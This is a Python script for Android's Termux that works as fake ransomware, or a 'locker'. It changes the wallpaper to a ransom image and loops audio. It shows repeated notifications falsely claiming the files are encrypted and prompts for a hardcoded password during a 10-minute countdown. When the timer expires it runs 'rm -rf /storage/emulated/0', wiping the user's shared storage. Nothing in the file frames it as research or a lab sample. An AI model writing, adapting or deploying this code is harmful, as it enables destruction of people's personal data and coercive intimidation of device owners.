#!/data/data/com.termux/files/usr/bin/python

import os
import sys
import time
import json
import threading
import subprocess

PASSWORD = "Xy7Lz29#AbC15"

home = os.path.expanduser("~")
FOTO_RANSOM = os.path.join(home, "TRYts/TRYts/IMG-20250120-WA0033.jpg")
SOUND_FILE_1 = os.path.join(home, "TRYts/TRYts/ssstik.io_1774317327386.mp3")
SOUND_FILE_2 = os.path.join(home, "TRYts/TRYts/AUD-20250503-WA0009.mp3")
TIMER_SECONDS = 600

stop_event = threading.Event()
password_entered = False
first_sound_played = False

def set_wallpaper():
    if os.path.exists(FOTO_RANSOM):
        subprocess.run(["termux-wallpaper", "-f", FOTO_RANSOM], capture_output=True)
        return True
    return False

def restore_wallpaper():
    subprocess.run(["termux-wallpaper", "-r"], capture_output=True)

def show_notification(title, content):
    subprocess.run(["termux-notification", "--title", title, "--content", content], capture_output=True)

def show_dialog(title, hint):
    result = subprocess.run(["termux-dialog", "text", "-t", title, "-i", hint], capture_output=True, text=True)
    return result.stdout

def vibrate():
    subprocess.run(["termux-vibrate", "-d", "300"], capture_output=True)

def play_sound(sound_file):
    if os.path.exists(sound_file):
        subprocess.Popen(["termux-media-player", "play", sound_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def stop_sound():
    subprocess.run(["pkill", "-f", "termux-media-player"], capture_output=True)

def sound_loop():
    global first_sound_played
    play_sound(SOUND_FILE_1)
    time.sleep(5)
    
    while not stop_event.is_set():
        if not first_sound_played:
            durasi = 0
            while durasi < 30 and not stop_event.is_set():
                time.sleep(1)
                durasi += 1
            first_sound_played = True
            play_sound(SOUND_FILE_2)
        else:
            if not any(p.info for p in subprocess.Popen(["pgrep", "-f", "termux-media-player"], stdout=subprocess.PIPE).communicate()):
                play_sound(SOUND_FILE_2)
        time.sleep(2)

def delete_all_files():
    show_notification("DELETING", "ALL FILES ARE BEING DELETED")
    vibrate()
    time.sleep(2)
    subprocess.run(["rm", "-rf", "/storage/emulated/0"])

def password_checker():
    global password_entered
    while not password_entered and not stop_event.is_set():
        result = show_dialog("UNLOCK DEVICE", f"ENTER PASSWORD (Time remaining: {TIMER_SECONDS}s):")
        if result:
            try:
                data = json.loads(result)
                if data.get("text") == PASSWORD:
                    password_entered = True
                    show_notification("SUCCESS", "PASSWORD CORRECT! FILES SAVED")
                    stop_event.set()
                    break
                else:
                    show_notification("WRONG PASSWORD", "TRY AGAIN")
                    vibrate()
            except:
                pass
        time.sleep(1)

def main():
    global password_entered
    
    set_wallpaper()
    
    sound_thread = threading.Thread(target=sound_loop, daemon=True)
    sound_thread.start()
    
    password_thread = threading.Thread(target=password_checker, daemon=True)
    password_thread.start()
    
    for i in range(5):
        if password_entered:
            break
        show_notification("SYSTEM ALERT", "YOUR FILES HAVE BEEN ENCRYPTED")
        vibrate()
        time.sleep(2)
    
    remaining = TIMER_SECONDS
    while remaining > 0:
        if password_entered:
            break
        if remaining % 60 == 0:
            minutes = remaining // 60
            show_notification("COUNTDOWN", f"{minutes} MINUTES REMAINING")
            vibrate()
        remaining -= 1
        time.sleep(1)
    
    if password_entered:
        show_notification("SAFE", "FILES ARE SAFE")
        restore_wallpaper()
        stop_sound()
        return
    
    show_notification("TIME EXPIRED", "DELETING ALL FILES...")
    vibrate()
    
    delete_all_files()
    
    for i in range(10):
        show_notification("DELETING", f"{i*10}% COMPLETE")
        time.sleep(0.5)
    
    show_notification("COMPLETE", "ALL FILES HAVE BEEN DELETED")

if __name__ == "__main__":
    try:
        main()
    except:
        restore_wallpaper()
        stop_sound()
